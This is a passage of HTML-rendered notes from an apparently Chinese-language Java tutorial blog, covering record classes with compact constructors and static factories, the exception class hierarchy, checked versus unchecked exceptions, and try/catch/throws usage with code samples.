&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Point[x=%s, y=%s]&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>除了用&lt;code>final&lt;/code>修饰class以及每个字段外，编译器还自动为我们创建了构造方法，和字段名同名的方法，以及覆写&lt;code>toString()&lt;/code>、&lt;code>equals()&lt;/code>和&lt;code>hashCode()&lt;/code>方法&lt;/p>
&lt;ul>
&lt;li>和&lt;code>enum&lt;/code>类似，我们自己不能直接从&lt;code>Record&lt;/code>派生，只能通过&lt;code>record&lt;/code>关键字由编译器实现继承&lt;/li>
&lt;li>如果要对参数进行检查，可以用Compact Constructor&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译器生成的方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这是我们编写的Compact Constructor:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这是编译器继续生成的赋值代码:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>作为&lt;code>record&lt;/code>的&lt;code>Point&lt;/code>仍然可以通过&lt;code>of()&lt;/code>添加静态方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="异常处理">异常处理&lt;/h2>
&lt;h3 id="异常捕获异常">异常&amp;amp;捕获异常&lt;/h3>
&lt;ul>
&lt;li>Java内置异常处理机制，是一种&lt;code>class&lt;/code>，本身带有类型信息；异常可以在任何地方抛出，但只需要在上层捕获，这样可以做到和方法调用分离&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>try {
String s = processFile(“C:\\test.txt”);
// ok:
} catch (FileNotFoundException e) {
// file not found:
} catch (SecurityException e) {
// no read permission:
} catch (IOException e) {
// io error:
} catch (Exception e) {
// other error:
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>继承关系是这样的&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227002539516.png" alt="image-20220227002539516">&lt;/p>
&lt;p>&lt;code>Throwable&lt;/code>是异常体系的根，它继承自&lt;code>Object&lt;/code>&lt;/p>
&lt;p>&lt;code>Error&lt;/code>表示严重错误，比如&lt;code>OutofMemoryError&lt;/code>, &lt;code>NoClassDefFoundError&lt;/code>, &lt;code>StackOverflowError&lt;/code>&lt;/p>
&lt;p>&lt;code>Exception&lt;/code>表示运行时的异常，可以被捕获并处理，比如&lt;code>NumberFormatException&lt;/code>, &lt;code>FileNotFoundException&lt;/code>, &lt;code>SocketException&lt;/code>；还包括一些可修正的语法错误，比如&lt;code>NullPointerException&lt;/code>, &lt;code>IndexOutOfBoundsException&lt;/code>&lt;/p>
&lt;ul>
&lt;li>常用异常&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-ascii" data-lang="ascii">Exception
│
├─ RuntimeException
│ │
│ ├─ NullPointerException
│ │
│ ├─ IndexOutOfBoundsException
│ │
│ ├─ SecurityException
│ │
│ └─ IllegalArgumentException
│ │
│ └─ NumberFormatException
│
├─ IOException
│ │
│ ├─ UnsupportedCharsetException
│ │
│ ├─ FileNotFoundException
│ │
│ └─ SocketException
│
├─ ParseException
│
├─ GeneralSecurityException
│
├─ SQLException
│
└─ TimeoutException
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>必须捕获的异常，包括&lt;code>Exception&lt;/code>及其子类，但不包括&lt;code>RuntimeException&lt;/code>及其子类，这种类型的异常称为Checked Exception&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果不捕获Checked Exception，编译器会报错，原因是方法定义时使用&lt;code>throws Xxx&lt;/code>表示该方法可能抛出的异常类型，导致调用方在调用的时候，必须强制捕获这些异常&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不需要捕获的异常，包括&lt;code>Error&lt;/code>及其子类，&lt;code>RuntimeException&lt;/code>及其子类&lt;/p>
&lt;/li>
&lt;li>
&lt;p>捕获异常需要提前import&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;中文&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 用指定编码转换String为byte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>只要是方法声明的Checked Exception，不在调用层捕获，也必须在更高的调用层捕获；所有未捕获的异常，最终也必须在&lt;code>main()&lt;/code>方法中捕获&lt;/li>
&lt;li>所有异常都可以调用&lt;code>printStackTrace()&lt;/code>方法打印异常栈&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 先记下来再说:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果不想用try可以直接把&lt;code>main()&lt;/code>方法定义为&lt;code>throws Exception&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;中文&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 用指定编码转换String为byte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>相当于声明了所有可能抛出的Exception，也就不用捕获了；代价就是一旦发生异常，程序会立刻退出，不够灵活&lt;/p>
&lt;ul>
&lt;li>当方法声明了可能抛出的异常，可以没有&lt;code>catch&lt;/code>，只使用&lt;code>try ... finally&lt;/code>结构&lt;/li>
&lt;/ul>
